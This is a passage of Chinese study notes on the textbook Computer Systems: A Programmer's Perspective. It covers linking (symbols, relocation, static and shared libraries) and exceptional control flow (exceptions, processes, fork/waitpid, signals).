符号和符号表</h3><p><strong>链接器符号是什么？符号表又是什么？</strong></p><ul><li><strong>链接器符号</strong>其实就是程序中的变量名、函数名。</li><li><strong>符号表</strong>是编译器为存储变量名、函数名、对象、类、接口等各种实体的出现情况而创建和维护的一种重要的<strong>数据结构</strong>。</li></ul><p><strong>链接器符号分为三种：</strong></p><ul><li><strong>由本模块m定义并能被其他模块引用的全局符号</strong>。对应于非静态的的c函数以及被定义为不带c语言static属性的全局变量。</li><li><strong>由其他模块定义并被模块m引用的全局符号成为外部符号</strong>。对应于定义在其他模块中的c语 言函数和变量。</li><li><strong>仅由本模块m定义和引用的本地符号</strong>。对应于在模块中定义的带static的C语言函数和全局变量，这些函数和变量只能在本模块中引用，不能在其他模块中引用。</li><li><strong>注意：链接器的局部符号不是指程序中的局部变量（分配在栈中的临时性变量），链接器不关心这种局部变量。</strong></li></ul><p><strong>全局符号的强弱：</strong></p><ul><li>在编译时，<strong>编译器向汇编器输出</strong>的每个<strong>全局符号</strong>，或者是<strong>强符号</strong>，或者是<strong>弱符号</strong>。</li><li><strong>强符号</strong>：函数和已初始化的全局变量。</li><li><strong>弱符号</strong>：未初始化的全局变量。</li><li>对于<strong>多重定义的全局符号</strong>：强符号和弱符号中选强符号，强符号只能有一个，如果没有则选弱符号其中之一。</li><li>所以我们在<strong>编程时要注意</strong>尽可能地<strong>避免使用全局变量</strong>，若要使用需要合理使用<strong>static、extern</strong>，记得<strong>变量初始化</strong>。</li></ul><p><strong>.symtab节的中包含的ELF符号表举例：</strong></p><p><img src="/posts/e0eae192/image-20210529134717830.png" alt="image-20210529134717830"></p><hr><h3 id="76-符号解析"><a class="markdownIt-Anchor" href="#76-符号解析"></a> 7.6 符号解析</h3><p>**链接器解析符号引用的方法：**将每个引用与它输入的可重定位目标文件的符号表中的一个确定的符号联系起来。</p><h4 id="61-链接器如何解析多重定义的全局符号"><a class="markdownIt-Anchor" href="#61-链接器如何解析多重定义的全局符号"></a> 6.1 链接器如何解析多重定义的全局符号</h4><p><strong>按如下规则处理：</strong></p><p>规则1: 不允许有多个强符号。<br>规则2: 如果有一个强符号和多个弱符号，那么选择强符号。<br>规则3: 如果有多个弱符号，那么从这些弱符号中任意选择一个。</p><h4 id="62-与静态库链接"><a class="markdownIt-Anchor" href="#62-与静态库链接"></a> 6.2 与静态库链接</h4><p>**静态库：**相关函数可以被编译为独立的目标模块，然后封装成一个单独的静态库文件。在链接时，链接器将只拷贝被程序引用的目标模块。</p><p><img src="/posts/e0eae192/image-20210615150100376.png" alt="image-20210615150100376"></p><h4 id="63-链接器如何使用静态库来解析引用"><a class="markdownIt-Anchor" href="#63-链接器如何使用静态库来解析引用"></a> 6.3 链接器如何使用静态库来解析引用</h4><p><img src="/posts/e0eae192/image-20210615151116120.png" alt="image-20210615151116120"></p><p>关于<strong>库的一般准则</strong>是将它们<strong>放在命令行的结尾</strong>。如果各个库的成员是相互独立的（也就是说没有成员引用另一个成员定义的符号），那么这些库就可以按照任何顺序放置在命令行的结尾处。<br>另一方面，如果库不是相互独立的，那么它们<strong>必须排序</strong>，使得对于每个被存档文件的成员外部引用的符号s,在命令行中至少有一个s的定义是在对s的引用之后的。</p><p>如果需要满足依赖需求，可以在<strong>命令行上重复库</strong></p><hr><h3 id="77-重定位"><a class="markdownIt-Anchor" href="#77-重定位"></a> 7.7 重定位</h3><p>重定位将合并输入模块，并为每个符号分配运行时地址。</p><p>重定位由两步组成：</p><ul><li>**重定位节和符号定义。**在这一步中，链接器将所有相同类型的节合并为同一类型的新的聚合节。例如，来自输入模块的.data节被全部合并成一个节，这个节成为输出的可执行<br>目标文件的.data节。然后，链接器将运行时存储器地址赋给新的聚合节，赋给输入模块定义的每个节，以及赋给输入模块定义的每个符号。当这一步完成时，程序中的每个指令和全局变量都有唯一的运行时存储器地址了。</li><li><strong>重定位节中的符号引用。<strong>在这一步中，链接器修改代码节和数据节中对每个符号的引用，使得它们指向正确的运行时地址。为了执行这一步，链接器依赖于称为</strong>重定位条目</strong>( relocation entry)的可重定位目标模块中的数据结构</li></ul><h4 id="771-重定位条目"><a class="markdownIt-Anchor" href="#771-重定位条目"></a> 7.7.1 重定位条目</h4><p><img src="/posts/e0eae192/image-20210615152035610.png" alt="image-20210615152035610"></p><p><strong>两种最基本的重定位类型：</strong></p><ul><li><p>**R_386_PC32：**重定位一个使用32位PC相对地址的引用。</p><p>一个PC相对地址就是距程序计数器(PC)的当前运行时值的偏移量。当CPU执行一条使用PC相对寻址的指令时，它就将在指令中编码的32位值上加上PC的当前运行时值，得到有效地址(如ca11指令的目标)，PC值通常是存储器中下一条指令的地址。</p></li><li><p>**R_386_32：**重定位一个使用32绝对地址的引用。</p><p>通过绝对寻址，CPU直接使用在指令中编码的32位值作为有效地址，不需要进一步修改。</p></li></ul><h4 id="772-重定位符号引用"><a class="markdownIt-Anchor" href="#772-重定位符号引用"></a> 7.7.2 重定位符号引用</h4><p><strong>重定位算法</strong></p><p><img src="/posts/e0eae192/image-20210615154815219.png" alt="image-20210615154815219"></p><p>ADDR(s)：每个节运行时地址</p><p>ADDR(r.symbol)：每个符号运行时地址</p><p><strong>1.重定位PC相对引用</strong></p><p>待重定位的代码</p><p><img src="/posts/e0eae192/image-20210615155050140.png" alt="image-20210615155050140"></p><p>重定位条目</p><p><img src="/posts/e0eae192/image-20210615155230646.png" alt="image-20210615155230646"></p><p>链接器已经确定</p><p><img src="/posts/e0eae192/image-20210615155304801.png" alt="image-20210615155304801"></p><p><img src="/posts/e0eae192/image-20210615155314174-1623743596124.png" alt="image-20210615155314174"></p><p>首先计算出引用的运行时地址，即偏移量的实际起始地址</p><p><img src="/posts/e0eae192/image-20210615155600812.png" alt="image-20210615155600812"></p><p>然后计算新的引用，即新的偏移量，从PC的当前值（当前指令的下一条指令起始地址）要偏移多少才会到swap的实际运行时地址</p><p>这个公式可以理解为引用的运行时地址加上引用所占据的字节数（bb+4)，然后用目标地址减去上面的值就是我们要得到的偏移量。</p><p>-4是由不同机器的引用长度决定的</p><p><img src="/posts/e0eae192/image-20210615155705059.png" alt="image-20210615155705059"></p><p>于是指令被修改为</p><p><img src="/posts/e0eae192/image-20210615155856359.png" alt="image-20210615155856359"></p><p><img src="/posts/e0eae192/image-20210615155910631.png" alt="image-20210615155910631"></p><p><strong>2.重定位PC绝对引用</strong></p><p><img src="/posts/e0eae192/image-20210615160238171.png" alt="image-20210615160238171"></p><p><img src="/posts/e0eae192/image-20210615160318085.png" alt="image-20210615160318085"></p><hr><h3 id="78-可执行目标文件"><a class="markdownIt-Anchor" href="#78-可执行目标文件"></a> 7.8 可执行目标文件</h3><p><img src="/posts/e0eae192/image-20210615161745659.png" alt="image-20210615161745659"></p><p>可执行文件p的段头部表</p><p><img src="/posts/e0eae192/image-20210615161847318.png" alt="image-20210615161847318"></p><p><img src="/posts/e0eae192/image-20210615161900425.png" alt="image-20210615161900425"></p><hr><h3 id="79-加载可执行目标文件"><a class="markdownIt-Anchor" href="#79-加载可执行目标文件"></a> 7.9 加载可执行目标文件</h3><p><img src="/posts/e0eae192/image-20210615162558215.png" alt="image-20210615162558215"></p><p><img src="/posts/e0eae192/image-20210615162610066.png" alt="image-20210615162610066"></p><hr><h3 id="710-动态链接共享库"><a class="markdownIt-Anchor" href="#710-动态链接共享库"></a> 7.10 动态链接共享库</h3><p>静态库存在如下缺点:</p><ul><li><p>在存储中的可执行文件中有多个副本 (每一个函数均需要静态库文件 )</p></li><li><p>在运行中的可执行文件中存在多个副本</p></li><li><p>即便是对系统库进行小bug的修复，也需要对使用到这个库的所有应用显示地重新链接</p></li></ul><p><strong>共享库</strong>( shared library)是致力于解决静态库缺陷的一个现代创新产物。共享库是一个目标模块，在运行时，可以加载到任意的存储器地址，并和一个在存储器中的程序链接起来。这个过程称为动态链接( dynamic linking),是由一个叫做动态链接器(dynamic linker)的程序来执行的。<br>共享库也称为共享目标( shared object),在Uniⅸ系统中通常用.so后缀来表示。微软的操作系统大量地利用了共享库，它们称为DLL（动态链接库）。</p><p><img src="/posts/e0eae192/image-20210615164131444.png" alt="image-20210615164131444"></p><hr><h3 id="713-处理目标文件的工具"><a class="markdownIt-Anchor" href="#713-处理目标文件的工具"></a> 7.13 处理目标文件的工具</h3><p>在Unix系统中有大量可用的工具可以帮助你理解和处理目标文件。特别地， GNU binutils包尤其有帮助，而且可以运行在每个Unⅸ平台上。</p><ul><li><strong>AR</strong>: 创建静态库，插入、删除、列出和提取成员。</li><li><strong>STRINGS</strong>: 列出一个目标文件中所有可打印的字符串。</li><li><strong>STRIP</strong>: 从目标文件中删除符号表信息。</li><li><strong>NM</strong>: 列出一个目标文件的符号表中定义的符号。</li><li><strong>SIZE</strong>: 列出目标文件中节的名字和大小</li><li><strong>READELF</strong>: 显示一个目标文件的完整结构，包括ELF头中编码的所有信息。包含SIZE和NM的功能</li><li><strong>OBJDUMP</strong>: 所有二进制工具之母。能够显示一个目标文件中所有的信息。它最大的作用是反汇编。text节中的二进制指今</li></ul><p>Unix系统为操作共亨库还提供了LDD程序：</p><ul><li><strong>LDD</strong>: 列出一个可执行文件在运行时所需要的共享库。</li></ul><hr><h2 id="第八章-异常控制流"><a class="markdownIt-Anchor" href="#第八章-异常控制流"></a> 第八章 异常控制流</h2><h3 id="81-异常"><a class="markdownIt-Anchor" href="#81-异常"></a> 8.1 异常</h3><p><strong>异常</strong>就是控制流中的突变，用来响应处理器状态中的某些变化。</p><p>状态变化称为<strong>事件</strong>。事件可能和当前指令的执行直接相关。<br>比如，发生虚拟存储器缺页、算术溢出，或者一条指令试图除以零。另一方面，事件也可能和当前指令的执行没有关系。比如，一个系统定时器产生信号或者一个I/O请求完成。</p><p><img src="/posts/e0eae192/image-20210615171511841.png" alt="image-20210615171511841"></p><p>在任何情况下，当处理器检测到有事件发生时，它就会通过一张叫做<strong>异常表</strong>(exception table)的跳转表，进行一个<strong>间接过程调用</strong>（异常)，到一个专门设计用来处理这类事件的操作系统子程序（<strong>异常处理程序</strong>( exception handler))</p><p>当异常处理程序完成处理后，根据引起异常的事件的类型，会发生以下三种情况中的一种：</p><ol><li>处理程序将控制返回给当前指令I<sub>curr</sub>，即当事件发生时正在执行的指令。</li><li>处理程序将控制返回给I<sub>next</sub>，即如果没有发生异常将会执行的下一条指令。</li><li>处理程序终止被中断的程序。</li></ol><h4 id="811-异常处理"><a class="markdownIt-Anchor" href="#811-异常处理"></a> 8.1.1 异常处理</h4><p>在系统启动时（当计算机重启或者加电时），操作系统分配和初始化一张称为<strong>异常表</strong>的跳转表，使得条目k包含异常k的处理程序的地址。图8-2展示了一张异常表的格式。</p><p>异常表的起始地址放在一个叫做<strong>异常表基址寄存器</strong>的特殊CPU寄存器中。</p><p><img src="/posts/e0eae192/image-20210615171950006.png" alt="image-20210615171950006"></p><p><strong>异常</strong>类似于过程调用，但也有一些不同之处：</p><ul><li>过程调用时，在跳转到处理程序之前，处理器将返回地址压入栈中。然而，根据异常的类型，返回地址要么是当前指令（当事件发生时正在执行的指令），要么是下一条描指令（如果事件不发生，将会在当前指令后执行的指令）。</li><li>处理器也把一些额外的处理器状态压到栈里，在处理程序返回时，重新开始被中断的程序会需要这些状态。比如，一个IA32系统将包含当前条件码和其他内容的EFLAGS寄存器压人栈中。</li><li>如果控制从一个用户程序转移到内核，那么所有这些项目都被压到内核栈中，而不是压到用户栈中。</li><li>异常处理程序运行在内核模式下(见8.2.4节)，这意味着它们对所有的系统资源都有完全的访问权限。</li></ul><h4 id="812-异常的类别"><a class="markdownIt-Anchor" href="#812-异常的类别"></a> 8.1.2 异常的类别</h4><p><img src="/posts/e0eae192/image-20210615172726725.png" alt="image-20210615172726725"></p><h5 id="1中断"><a class="markdownIt-Anchor" href="#1中断"></a> 1.中断</h5><p>中断是异步发生的，是来自处理器外部的I/O设备的信号的结果。</p><p><img src="/posts/e0eae192/image-20210615172954970.png" alt="image-20210615172954970"></p><h5 id="2陷阱和系统调用"><a class="markdownIt-Anchor" href="#2陷阱和系统调用"></a> 2.陷阱和系统调用</h5><p>陷阱是有意的异常，是执行一条指令的结果。</p><p>陷阱<strong>最重要的用途</strong>是在用户程序和内核之间提供一个像过程一样的接口，叫做<strong>系统调用</strong>。</p><p><img src="/posts/e0eae192/image-20210615173310199.png" alt="image-20210615173310199"></p><p><strong>系统调用和普通的函数调用</strong>实现非常不同：</p><ul><li>普通的函数运行在用户模式(user mode)中，用户模式<br>限制了函数可以执行的指令的类型，而且它们只能访问与调用函数相同的栈。</li><li>系统调用运行在内核模式(kernel mode)中，内核模式允许系统调用执行指令，并访问定义在内核中的栈。</li></ul><h5 id="3故障"><a class="markdownIt-Anchor" href="#3故障"></a> 3.故障</h5><p>故障由错误情况引起，它可能能够被故障处理程序修正。当故障发生时，处理器将控制转移给故障处理程序。如果处理程序能够修正这个错误情况，它就将控制返回到引起故障的指令，从而重新执行它。否则，处理程序返回到内核中的 abort例程， abort例程会终止引起故障的应用程序。</p><p><img src="/posts/e0eae192/image-20210615173712103.png" alt="image-20210615173712103"></p><h5 id="4终止"><a class="markdownIt-Anchor" href="#4终止"></a> 4.终止</h5><p>终止是不可恢复的致命错误造成的结果，通常是一些硬件错误，比如DRAM或者SRAM位被损坏时发生的奇偶错误。终止处理程序从不将控制返回给应用程序。如图8-8所示，处理程序将控制返回给一个 abort例程，该例程会终止这个应用程序。</p><p><img src="/posts/e0eae192/image-20210615173835444.png" alt="image-20210615173835444"></p><h4 id="813-linuxia32系统中的异常"><a class="markdownIt-Anchor" href="#813-linuxia32系统中的异常"></a> 8.1.3 Linux/IA32系统中的异常</h4><h5 id="1linuxia32故障和终止"><a class="markdownIt-Anchor" href="#1linuxia32故障和终止"></a> 1.Linux/IA32故障和终止</h5><p><img src="/posts/e0eae192/image-20210615174044372.png" alt="image-20210615174044372"></p><h5 id="2linuxia32系统调用"><a class="markdownIt-Anchor" href="#2linuxia32系统调用"></a> 2.Linux/IA32系统调用</h5><p><img src="/posts/e0eae192/image-20210615174116950.png" alt="image-20210615174116950"></p><hr><h3 id="82-进程"><a class="markdownIt-Anchor" href="#82-进程"></a> 8.2 进程</h3><p><strong>进程</strong>的经典定义就是一个执行中的程序的实例。系统中的每个程序都是运行在某个进程的上下文( context)中的。上下文是由程序正确运行所需的状态组成的。这个状态包括存放在存储器中的程序的代码和数据、它的栈、通用目的寄存器的内容、程序计数器、环境变量以及打开文件描述符的集合。</p><p>进程提供给应用程序两个<strong>关键抽象</strong>：</p><ul><li>一个独立的逻辑控制流，它提供一个假象，好像我们的程序独占地使用处理器。</li><li>一个私有的地址空间，它提供一个假象，好像我们的程序独占地使用存储器系统。</li></ul><h4 id="821-逻辑控制流"><a class="markdownIt-Anchor" href="#821-逻辑控制流"></a> 8.2.1 逻辑控制流</h4><p><strong>逻辑控制流</strong>提供一个假象，好像我们的程序在独占地使用处理器。如果想用调试器单步执行程序，我们会看到一系列的程序计数器(PC)的值，这些值唯一地对应于包含在程序的可执行目标文件中的指令，或者是包含在运行时动态链接到程序的共享对象中的指令。这个PC值的序列叫做<strong>逻辑控制流</strong>，或者简称逻辑流。</p><p><img src="/posts/e0eae192/image-20210615190649412.png" alt="image-20210615190649412"></p><h4 id="822-并发流"><a class="markdownIt-Anchor" href="#822-并发流"></a> 8.2.2 并发流</h4><p><strong>并发流</strong>：一个逻辑流的执行在时间上与另一个流重叠。更准确地说，流Ⅹ和Y互相并发，当且仅当X在Y开始之后和Y结束之前开始，或者Y在X开始之后和X结束之前开始。</p><p>**并发：**多个流并发地执行的一般现象</p><p>**多任务：**一个进程和其他进程轮流运行的概念</p><p>**时间片：**一个进程执行它的控制流的一部分的每一时间叫做时间片，多任务也叫作时间分片。</p><p>**并行流：**两个流并发的运行在不同的处理器核或者计算机上，它们并行地运行，且并行地执行</p><h4 id="823-私有地址空间"><a class="markdownIt-Anchor" href="#823-私有地址空间"></a> 8.2.3 私有地址空间</h4><p>进程也为每个程序提供一种假象，好像它独占地使用系统地址空间。</p><p>一个进程为每个程序提供它自己的私有地址空间。一般而言，和这个空间中某个地址相关联的那个存储器字节是不能被其他进程读或者写的，从这个意义上说，这个地址空间是私有的。</p><p><img src="/posts/e0eae192/image-20210622073331434.png" alt="image-20210622073331434"></p><h4 id="824-用户模式和内核模式"><a class="markdownIt-Anchor" href="#824-用户模式和内核模式"></a> 8.2.4 用户模式和内核模式</h4><p>通过模式位来控制</p><p>**内核模式：**设置了模式位后，一个运行在内核模式的进程可以执行指令集中的任何指令，并且可以访问系统中任何存储器位置。</p><p>**用户模式：**没有设置模式位时，进程就运行在用户模式中。用户模式中的进程不允许执行特权指令(privileged instruction),比如停止处理器、改变模式位，或者发起一个IO操作。也不允许用户模式中的进程直接引用地址空间中内核区内的代码和数据。任何这样的尝试都会导致致命的保护故障。反之，用户程序必须通过系统调用接口间接地访问内核代码和数据。</p><h4 id="825-上下文切换"><a class="markdownIt-Anchor" href="#825-上下文切换"></a> 8.2.5 上下文切换</h4><p>操作系统内核使用一种称为<strong>上下文切换</strong>的较高层形式的异常控制流来实现多任务。</p><p><strong>上下文</strong>就是内核重新启动一个被抢占的进程所需的状态。它由一些对象的值组成，这些对象包括通用目的寄存器、浮点寄存器、程序计数器、用户栈、状态寄存器、内核栈和各种内核数据结构，比如描绘地址空间的页表、包含有关当前进程信息的进程表，以及包含进程已打开文件的信息的文件表。<br>在进程执行的某些时刻，内核可以决定抢占当前进程，并重新开始一个先前被抢占的进程。这种决定就叫做<strong>调度</strong>( schedule),是由内核中称为<strong>调度器</strong>( scheduler)的代码处理的。当内核选择一个新的进程运行时，我们就说内核调度了这个进程。在内核调度了一个新的进程运行后，它就抢占当前进程，并使用一种称为上下文切换的机制来将控制转移到新的进程。</p><p><strong>上下文切换：</strong></p><ol><li><p>保存当前进程的上下文</p></li><li><p>恢复某个先前被抢占的进程被保存的上下文</p></li><li><p>将控制传递给这个新恢复的进程。</p></li></ol><p><img src="/posts/e0eae192/image-20210615194036573.png" alt="image-20210615194036573"></p><hr><h3 id="83-系统调用错误处理"><a class="markdownIt-Anchor" href="#83-系统调用错误处理"></a> 8.3 系统调用错误处理</h3><p>当Unix系统级函数遇到错误时，它们典型地返回-1,并设置全局整数变量errno来表示什么出错了。</p><p><img src="/posts/e0eae192/image-20210615194451811.png" alt="image-20210615194451811"></p><p>简化</p><p><img src="/posts/e0eae192/image-20210615194500771.png" alt="image-20210615194500771"></p><p>再简化</p><p><img src="/posts/e0eae192/image-20210615194519890.png" alt="image-20210615194519890"></p><p>再简化</p><p><img src="/posts/e0eae192/image-20210615194534416.png" alt="image-20210615194534416"></p><hr><h3 id="84-进程控制"><a class="markdownIt-Anchor" href="#84-进程控制"></a> 8.4 进程控制</h3><h4 id="841-获取进程id"><a class="markdownIt-Anchor" href="#841-获取进程id"></a> 8.4.1 获取进程ID</h4><p><img src="/posts/e0eae192/image-20210615200923542.png" alt="image-20210615200923542"></p><h4 id="842-创建和终止进程"><a class="markdownIt-Anchor" href="#842-创建和终止进程"></a> 8.4.2 创建和终止进程</h4><p>从程序员的角度，我们可以认为进程总是处于下面三种状态之一：</p><ul><li><p><strong>运行</strong>。进程要么在CPU上执行，要么在等待被执行且最终会被内核调度。</p></li><li><p><strong>停止</strong>。进程的执行被挂起( suspend),且不会被调度。当收到 SIGSTOP、 SIGTSTP、SIDTTIN或者 SIGTTOU信号时，进程就停止，并且保持停止直到它收到一个 SIGCONT信号，在这个时刻，进程再次开始运行。</p></li><li><p><strong>终止</strong>。进程永远地停止了。进程会因为三种原因终止：</p><ol><li><p>收到一个信号，该信号的默认行为是终止进程，</p></li><li><p>从主程序返回</p></li><li><p>调用exit函数。</p></li></ol></li></ul><p><strong>子进程（fork函数如何创建）：<strong>新创建的子讲程几乎但不完全与父进程相同。子进程得到与父进程用户级虚拟地址空间相同的（但是独立的）一份拷贝，包括文本、数据和bss段、堆以及用户栈。子进程还获得与父进程任何打开文件描述符相同的拷贝，这就意味着当父进程调用fork时，子进程可以读写父进程中打开的任何文件。父进程和新创建的子进程之间</strong>最大的区别</strong>在于它们有<strong>不同的PID</strong>。</p><p>示例程序：</p><p><img src="/posts/e0eae192/image-20210615201819338.png" alt="image-20210615201819338"></p><p>**fork函数的特点：**调用一次，返回两次一次是在调用进程（父进程）中，一次是在新创建的子进程中。在父进程中，fork返回子进程的<br>PID。在子进程中，fork返回0。因为子进程的PID总是非零的，返回值就提供一个明确的方法来分辨程序是在父进程还是在子进程中执行。</p><p><strong>这个例子（父子进程）的一些特点：</strong></p><ul><li><p>**调用一次，返回两次。**fork函数被父进程调用一次，但是却返回两次。一次是返回到父进程，一次是返回到新创建的子进程。</p></li><li><p>**并发执行。**父进程和子进程是并发运行的独立进程。内核能够以任意方式交替执行它们的逻辑控制流中的指令。当我们在系统上运行这个程序时，父进程先完成它的 printf语句，然后是子进程。然而，在另一个系统上可能正好相反。一般而言，作为程序员，我们决不能对不同进程中指令的交替执行做任何假设。</p></li><li><p>**相同的但是独立的地址空间。**如果能够在fork函数在父进程和子进程中返回后立即暂停这两个进程，我们会看到每个进程的地址空间都是相同的。每个进程有相同的用户栈、相同的本地变量值、相同的堆、相同的全局变量值，以及相同的代码。</p><p>因此，在我们的示例程序中，当fork函数在第8行返回时，本地变量x在父进程和子进程中都为1。然而因为父进程和子进程是独立的进程，它们都有自己的私有地址空间。父进程和子进程对所做的任何改变都是独立的，不会反映在另一个进程的存储器中。这就是为什么当父进程和子进程调用它们各自的 printf语句时，它们中的变量x会有不同的值的原因。</p></li><li><p>**共享文件。**当运行这个示例程序时，我们注意到父进程和子进程都把它们的输出显示在屏幕上。原因是子进程继承了父进程所有的打开文件。当父进程调用fork时， stdout文件是被打开的，并指向屏幕。子进程继承了这个文件，因此它的输出也是指向屏幕的。</p></li></ul><p><img src="/posts/e0eae192/image-20210615201857583.png" alt="image-20210615201857583"></p><h4 id="843-回收子进程"><a class="markdownIt-Anchor" href="#843-回收子进程"></a> 8.4.3 回收子进程</h4><p>**僵死进程：**一个终止了但未被回收的进程</p><p><strong>waitpid函数：</strong></p><p><img src="/posts/e0eae192/image-20210615203910901.png" alt="image-20210615203910901"></p><p>默认地(当 options=0时)， waitpid<strong>挂起</strong>调用进程的执行，直到它的等待集合中的一个子进程终止。</p><p>如果等待集合中的一个进程在刚调用的时刻就已经终止了，那么 waitpid就立即返回。在这两种情况下， waitpid返回导致 waitpid返回的<strong>已终止子进程的PID</strong>,并且将这个已终止的子进程从系统中去除。</p><ol><li><p><strong>判断等待集合的成员</strong></p><p>等待集合的成员是由参数pid来确定的：</p><ul><li>如果pid&gt;0,那么等待集合就是一个单独的子进程，它的进程D等于pid</li><li>如果pid=-1,那么等待集合就是由父进程所有的子进程组成的。</li></ul></li><li><p><strong>修改默认行为</strong></p><p>可以通过将 options设置为常量 WNOHANG和WUNTIRACED的各种组合，修改默认行为</p><ul><li>**WNOHANG:**如果等待集合中的任何子进程都还没有终止，那么就立即返回（返回值为0)。默认的行为是挂起调用进程，直到有子进程终止。在等待子进程终止的同时，如果还想做些有用的工作，这个选项会有用</li><li>**WUNTRACED:**挂起调用进程的执行，直到等待集合中的一个进程变成已终止或者被停止。返回的PD为导致返回的已终止或被停止子进程的PD。默认的行为是只返回已终止的子进程。当你想要检查已终止和被停止的子进程时，这个选项会有用。</li><li><strong>WNOHANG|WUNTRACED</strong>:立即返回，如果等待集合中没有任何子进程被停止或已终止，那么返回值为0,或者返回值等于那个被停止或者已终止的子进程的PID。</li></ul></li><li><p><strong>检查已回收子进程的退出状态</strong></p><p>如果 status参数是非空的，那么 waitpid就会在 status参数中放上关于导致返回的子进程的状态信息。wait,h头文件定义了解释 status参数的几个宏：</p><ul><li><strong>WIFEXITED(status)</strong>：如果子进程通过调用exit或者一个返回(return)正常终止，就返回真。</li><li><strong>WEXITSTATUS(status):</strong> 返回一个正常终止的子进程的退出状态。只有在 WIFEXITED返回为真时，才会定义这个状态。</li><li><strong>WIFSIGNALED(status):</strong> 如果子进程是因为一个未被捕获的信号终止的，那么就返回真(将在8.5节中解释说明信号)。</li><li><strong>WTERMSIG(status):</strong> 返回导致子进程终止的信号的数量。只有在 WIFSIGNALED(status)返回为真时，才定义这个状态。</li><li><strong>WIFSTOPPED(status):</strong> 如果引起返回的子进程当前是被停止的，那么就返回真。</li><li>WSTOPSIG(status): 返回引起子进程停止的信号的数量。只有在 WIFSTOPPED(status)返回为真时，才定义这个状态。</li></ul></li><li><p><strong>错误条件</strong></p><p>如果调用进程没有子进程，那么 waitpid返回-1,并且设置 errno为 <strong>ECHILD</strong>。如果waitpid函数被一个信号中断，那么它返回-1,并设置 errno为 <strong>EINTR</strong>。</p></li><li><p>wait<strong>函数</strong></p><p><img src="/posts/e0eae192/image-20210615205135841.png" alt="image-20210615205135841"></p></li></ol><h4 id="844-让进程休眠"><a class="markdownIt-Anchor" href="#844-让进程休眠"></a> 8.4.4 让进程休眠</h4><p><strong>sleep函数</strong></p><p><img src="/posts/e0eae192/image-20210615205249733.png" alt="image-20210615205249733"></p><p><strong>pause函数</strong></p><p><img src="/posts/e0eae192/image-20210615205335143.png" alt="image-20210615205335143"></p><h4 id="845-加载并运行程序"><a class="markdownIt-Anchor" href="#845-加载并运行程序"></a> 8.4.5 加载并运行程序</h4><h4 id="846-利用fork和execve运行程序"><a class="markdownIt-Anchor" href="#846-利用fork和execve运行程序"></a> 8.4.6 利用fork和execve运行程序</h4><hr><h3 id="85-信号"><a class="markdownIt-Anchor" href="#85-信号"></a> 8.5 信号</h3><p><strong>信号</strong>就是一条小消息，它通知进程系统中发射了一个某种类型的事件。</p><p><img src="/posts/e0eae192/image-20210616132126470.png" alt="image-20210616132126470"></p><h4 id="851-信号术语"><a class="markdownIt-Anchor" href="#851-信号术语"></a> 8.5.1 信号术语</h4><p>传送一个信号到目的进程是由两个不同步骤组成的：</p><ul><li><strong>发送信号</strong>。内核通过更新目的进程上下文中的某个状态，发送（递送）一个信号给目的进程。发送信号可以有如下两个原因：<ul><li><ol><li>内核检测到一个系统事件，比如被零除错误或者<br>子进程终止。</li></ol></li><li><ol start="2"><li>一个进程调用了kill函数（在下一节中讨论），显式地要求内核发送一个信号给目的进程。一个进程可以发送信号给它自己。</li></ol></li></ul></li><li><strong>接收信号</strong>。当目的进程被内核强迫以某种方式对信号的发送做出反应时，目的进程就接收了信号。进程可以忽略这个信号，终止或者通过执行一个称为信号处理程序（signal handler)的用户层函数捕获这个信号。</li></ul><p><img src="/posts/e0eae192/image-20210616134151781-1623822116278.png" alt="image-20210616134151781"></p><p>**待处理信号（pending signal)：**一个只发出而没有被接收的信号。</p><ul><li><p>在任何时刻，一种类型只会有有一个待处理信号。</p></li><li><p>一个进程可以有选择性地阻塞接受某种信号。当一种信号被阻塞时，它仍可以被发送，但是产生的待处理信号不会被接受，知道进程取消对这种信号的阻塞。</p></li><li><p>一个待处理信号最多被接受一次。</p></li></ul><h4 id="852-发送信号"><a class="markdownIt-Anchor" href="#852-发送信号"></a> 8.5.2 发送信号</h4><ol><li><p><strong>进程组</strong></p><p><img src="/posts/e0eae192/image-20210616135725636.png" alt="image-20210616135725636"></p><p><img src="/posts/e0eae192/image-20210616135744711.png" alt="image-20210616135744711"></p></li><li><p><strong>用/bin/kill程序发送信号</strong></p><p><img src="/posts/e0eae192/image-20210616135759238.png" alt="image-20210616135759238"></p></li><li><p><strong>从键盘发送信号</strong></p><p><img src="/posts/e0eae192/image-20210616140206513.png" alt="image-20210616140206513"></p><p><img src="/posts/e0eae192/image-20210616140217571.png" alt="image-20210616140217571"></p></li><li><p><strong>用kill函数发送信号</strong></p><p><img src="/posts/e0eae192/image-20210616140454210.png" alt="image-20210616140454210"></p></li><li><p><strong>用alarm函数发生信号</strong></p><p><img src="/posts/e0eae192/image-20210616141623550.png" alt="image-20210616141623550"></p><p><img src="/posts/e0eae192/image-20210616141648506.png" alt="image-20210616141648506"></p></li></ol><h4 id="853-接收信号"><a class="markdownIt-Anchor" href="#853-接收信号"></a> 8.5.3 接收信号</h4><p>当内核从一个异常处理程序返回，准备将控制传递给进程P时，它会检查进程P的未被阻塞的待处理信号的集合( pending&amp;~ blocked)。如果这个集合为空（通常情况下），那么内核将控制传递到p的逻辑控制流中的下一条指令(l<sub>next</sub>).<br>然而，如果集合是非空的，那么内核选择集合中的某个信号k(通常是最小的k),并且强制P接收信号k。收到这个信号会触发进程的某种行为。一旦进程完成了这个行为，那么控制就传递回P的逻辑控制流中的下一条指令(l<sub>next</sub>)。</p><p>每个信号类型都有一个预定义的<strong>默认行为</strong>，是下面中的一种：</p><ul><li>进程终止。</li><li>进程终止并转储存储器 (dump core)。</li><li>进程停止直到被 SIGCONT信号重启。</li><li>进程忽略该信号。</li></ul><p><strong>signal函数：</strong></p><p>进程通过使用一个signal函数修改和信号相关联的默认行为</p><p><img src="/posts/e0eae192/image-20210616143233373.png" alt="image-20210616143233373"></p><p>signal函数可以通过下列三种方法之一来改变和信号 signum相关联的行为：</p><ul><li>如果 handler是SIG_IGN,那么忽略类型为 signum的信号。</li><li>如果 handler是SIG_DFL,那么类型为 signum的信号行为恢复为默认行为。</li><li>否则， handler就是用户定义的函数的地址，这个函数称为<strong>信号处理程序</strong>（ signal handler),只要进程接收到一个类型为 signum的信号，就会调用这个程序。通过把处理程序的地址传递到 signal函数从而改变默认行为，这叫做<strong>设置信号处理程序</strong>（installing the handler)。调用信号处理程序称为<strong>捕获信号</strong>。执行信号处理程序称为<strong>处理信号</strong>。</li></ul><p><img src="/posts/e0eae192/image-20210616150205507.png" alt="image-20210616150205507"></p><p><img src="/posts/e0eae192/image-20210616150220611.png" alt="image-20210616150220611"></p><h4 id="854-信号处理问题"><a class="markdownIt-Anchor" 